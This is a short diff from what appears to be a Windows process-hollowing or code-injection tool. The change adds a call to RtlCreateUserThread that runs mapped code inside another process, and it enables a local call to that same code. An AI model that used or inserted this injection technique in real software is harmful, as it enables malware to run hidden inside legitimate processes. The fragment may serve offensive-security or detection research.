@@ -433,7 +433,8 @@ INT main() {
 				printf("[+] Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", (const PCHAR)pMapBuf, qwMapBufSize);
 				printf("[*] Calling 0x%p...\r\n", (const PCHAR)pMappedCode);
 
-				//((fnAddr)pMappedCode)();
+				NTSTATUS status = pRtlCreateUserThread(hProcessHandle, NULL, FALSE, 0, 0, 0, pMappedRemoteCode, NULL, &hTargetThreadHandle, NULL);
+				((fnAddr)pMappedCode)();
 				//((fnAddr)pMappedRemoteCode)();
 
 				//ntStatus = pRtlCreateUserThread(hProcessHandle, NULL, FALSE, 0, 0, 0, pMappedRemoteCode, NULL, &hTargetThreadHandle, NULL);
